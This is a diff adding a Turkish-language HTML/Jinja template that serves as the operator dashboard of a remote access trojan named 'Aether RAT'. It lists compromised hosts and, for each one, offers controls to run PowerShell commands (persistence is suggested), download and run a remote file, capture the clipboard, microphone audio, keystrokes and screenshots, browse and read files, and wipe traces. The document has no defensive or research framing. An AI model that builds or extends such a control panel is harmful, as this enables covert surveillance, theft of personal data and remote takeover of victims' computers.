@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aether RAT</title>
+    <style>
+        :root {
+            --bg-deep: #020202;
+            --neon-red: #da1b1b;
+            --text-pure: #ffffff;
+            --text-muted: #55555d;
+            --text-dim: #94949e;
+        }
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-pure);
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        body::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%);
+            z-index: 99999;
+            background-size: 100% 4px;
+            pointer-events: none;
+        }
+        .hud-wrapper {
+            display: flex;
+            height: 100vh;
+            width: 100vw;
+        }
+        .sidebar {
+            width: 360px;
+            background: transparent;
+            border-right: 1px dashed rgba(218, 27, 27, 0.2);
+            display: flex;
+            flex-direction: column;
+            padding: 30px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+        .main-stage {
+            flex-grow: 1;
+            background: transparent;
+            padding: 40px;
+            box-sizing: border-box;
+            overflow-y: auto;
+            position: relative;
+        }
+        .branding {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .logo {
+            width: 100%;
+            max-width: 280px;
+            height: auto;
+            object-fit: contain;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 15px rgba(218, 27, 27, 0.3));
+        }
+        .branding h1 {
+            font-size: 38px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            margin: 0;
+            color: var(--text-pure);
+        }
+        .section-title {
+            font-size: 11px;
+            color: var(--text-muted);
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+        }
+        .agent-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .agent-badge {
+            cursor: pointer;
+            transition: all 0.2s ease;
+            padding-left: 10px;
+            border-left: 1px solid transparent;
+        }
+        .agent-badge:hover {
+            border-left: 2px solid var(--neon-red);
+            padding-left: 14px;
+        }
+        .agent-badge.selected {
+            border-left: 2px solid var(--neon-red);
+            padding-left: 14px;
+        }
+        .agent-badge .name {
+            font-size: 14px;
+            font-weight: bold;
+            color: var(--text-pure);
+            margin-bottom: 4px;
+        }
+        .agent-badge.selected .name {
+            color: var(--neon-red);
+            text-shadow: 0 0 8px rgba(218, 27, 27, 0.5);
+        }
+        .agent-badge .meta {
+            font-size: 11px;
+            color: var(--text-dim);
+            display: flex;
+            justify-content: space-between;
+        }
+        .empty-signal {
+            color: var(--neon-red);
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+        .lock-screen {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: var(--bg-deep);
+            color: var(--text-muted);
+            font-size: 12px;
+            letter-spacing: 3px;
+            z-index: 10;
+        }
+        .workspace {
+            display: flex;
+            flex-direction: column;
+            gap: 45px;
+            animation: fadeIn 0.3s ease-out forwards;
+        }
+        .action-list {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+        .control-row {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            padding-bottom: 14px;
+        }
+        .control-row form {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            width: 100%;
+        }
+        .control-row label {
+            font-size: 13px;
+            color: var(--text-dim);
+            min-width: 250px;
+        }
+        input[type="text"] {
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid var(--text-muted);
+            color: var(--text-pure);
+            padding: 4px 0;
+            font-family: inherit;
+            font-size: 13px;
+            flex-grow: 1;
+            transition: border-color 0.2s;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-bottom: 1px solid var(--neon-red);
+        }
+        .btn-text {
+            background: transparent;
+            color: var(--text-dim);
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 13px;
+            padding: 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: color 0.2s;
+        }
+        .btn-text:hover {
+            color: var(--text-pure);
+        }
+        .btn-trigger {
+            color: var(--neon-red);
+        }
+        .btn-trigger:hover {
+            color: #ffffff;
+            text-shadow: 0 0 8px var(--neon-red);
+        }
+        .file-stream {
+            display: flex;
+            flex-direction: column;
+        }
+        .file-node {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            font-size: 13px;
+        }
+        .file-actions {
+            display: flex;
+            gap: 20px;
+        }
+        .raw-output {
+            color: var(--neon-red);
+            font-size: 13px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            line-height: 1.6;
+            margin: 0;
+        }
+        .agent-stage-panel {
+            display: none;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="hud-wrapper">
+        <div class="sidebar">
+            <div class="branding">
+                <img src="/static/logo.png" alt="Aether RAT" class="logo">
+                <h1>Aether RAT</h1>
+            </div>
+            
+            <div class="section-title">// ULAŞILABİLİR İSTASYONLAR</div>
+            <div class="agent-list">
+                {% if not agents %}
+                <div class="empty-signal">// SİNYAL KESİK</div>
+                {% endif %}
+                {% for aid, info in agents.items() %}
+                <div class="agent-badge" onclick="activateTerminal('{{ aid }}', this)">
+                    <div class="name"># {{ info.hostname }}</div>
+                    <div class="meta">
+                        <span>{{ info.ip }}</span>
+                        <span>[{{ info.os }}]</span>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+
+        <div class="main-stage">
+            <div id="stage-lock" class="lock-screen">
+                // SİSTEM BAĞLANTISI BEKLENİYOR
+            </div>
+            {% for aid, info in agents.items() %}
+            <div id="terminal-panel-{{ aid }}" class="agent-stage-panel">
+                <div class="workspace">
+                    <div>
+                        <div class="section-title">// OPERASYONEL KOMUTLAR : {{ info.hostname }}</div>
+                        <div class="action-list">
+                            <div class="control-row">
+                                <form action="/v1/cmd" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Manuel PowerShell Komutu</label>
+                                    <input type="text" name="cmd" placeholder="Kalıcılık komutu veya özel betik girin..." required>
+                                    <button type="submit" class="btn-text btn-trigger">[ Komutu Gönder ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/down" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Uzak Dosya Yükleyici</label>
+                                    <input type="text" name="url" placeholder="http://hedef.com" required>
+                                    <button type="submit" class="btn-text btn-trigger">[ Çalıştır ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/clip" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Pano Geçmişini Yakala</label>
+                                    <button type="submit" class="btn-text btn-trigger">[ Veriyi Çek ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/mic" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Mikrofon Ortam Kaydı (5sn)</label>
+                                    <button type="submit" class="btn-text btn-trigger">[ Dinle ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/kl" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Klavye Girdi Günlüğü</label>
+                                    <button type="submit" class="btn-text btn-trigger">[ Logları Al ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/sc" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Anlık Ekran Yakalama</label>
+                                    <button type="submit" class="btn-text btn-trigger">[ Görüntüle ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/ps" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label>Aktif Süreç Ağacı</label>
+                                    <button type="submit" class="btn-text btn-trigger">[ Listele ]</button>
+                                </form>
+                            </div>
+                            <div class="control-row">
+                                <form action="/v1/wipe" method="POST">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <label style="color: var(--neon-red);">İstasyon İzlerini Temizle</label>
+                                    <button type="submit" class="btn-text btn-trigger" style="color: var(--neon-red);">[ İMHA ET ]</button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="section-title">// DİZİN NAVİGASYONU</div>
+                        <div class="file-stream">
+                            <div style="margin-bottom: 20px;">
+                                <form action="/v1/fl" method="POST" style="display: flex; gap: 20px; align-items: center;">
+                                    <input type="hidden" name="id" value="{{ aid }}">
+                                    <span style="color: var(--text-muted);">KONUM:</span>
+                                    <input type="text" name="path" value="{{ info.current_path }}">
+                                    <button type="submit" class="btn-text btn-trigger">[ Git ]</button>
+                                </form>
+                            </div>
+                            
+                            {% if not info.files %}
+                            <div class="file-node" style="color: var(--text-muted);">// Listelenecek nesne yok.</div>
+                            {% endif %}
+                            {% for file in info.files %}
+                            <div class="file-node">
+                                <span style="color: var(--text-dim);">+ {{ file }}</span>
+                                <div class="file-actions">
+                                    <form action="/v1/cat" method="POST" style="display: inline;" target="_blank">
+                                        <input type="hidden" name="id" value="{{ aid }}">
+                                        <input type="hidden" name="filename" value="{{ file }}">
+                                        <button type="submit" class="btn-text">[ Oku ]</button>
+                                    </form>
+                                    <form action="/v1/fl" method="POST" style="display: inline;">
+                                        <input type="hidden" name="id" value="{{ aid }}">
+                                        {% if info.current_path.endswith('\\') %}
+                                        <input type="hidden" name="path" value="{{ info.current_path }}{{ file }}">
+                                        {% else %}
+                                        <input type="hidden" name="path" value="{{ info.current_path }}\\{{ file }}">
+                                        {% endif %}
+                                        <button type="submit" class="btn-text">[ Dizin Aç ]</button>
+                                    </form>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+
+                    {% if info.screenshot %}
+                    <div>
+                        <div class="section-title">// MATRİS EKRAN VERİSİ</div>
+                        <img src="data:image/png;base64,{{ info.screenshot }}" style="max-width: 100%; filter: grayscale(20%) contrast(110%); margin-bottom: 12px; border-bottom: 1px dashed var(--neon-red); display: block;">
+                        <a href="data:image/png;base64,{{ info.screenshot }}" download="feed.png" class="btn-text btn-trigger">[ DOSYAYI YEREL KOPYALA ]</a>
+                    </div>
+                    {% endif %}
+
+                    {% if info.last_result %}
+                    <div>
+                        <div class="section-title">// KONSOL ÇIKTI GÜNLÜĞÜ</div>
+                        <pre class="raw-output">{{ info.last_result }}</pre>
+                    </div>
+                    {% endif %}
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <script>
+        function activateTerminal(aid, badgeElement) {
+            document.querySelectorAll('.agent-stage-panel').forEach(panel => {
+                panel.style.display = 'none';
+            });
+            document.querySelectorAll('.agent-badge').forEach(badge => {
+                badge.classList.remove('selected');
+            });
+
+            const lock = document.getElementById('stage-lock');
+            if (lock) lock.style.display = 'none';
+
+            const activePanel = document.getElementById('terminal-panel-' + aid);
+            if (activePanel) {
+                activePanel.style.display = 'block';
+            }
+            badgeElement.classList.add('selected');
+            localStorage.setItem('selectedAgentId', aid);
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedAid = localStorage.getItem('selectedAgentId');
+            if (savedAid) {
+                const badges = document.querySelectorAll('.agent-badge');
+                for (let badge of badges) {
+                    if (badge.getAttribute('onclick').includes(savedAid)) {
+                        badge.click();
+                        break;
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
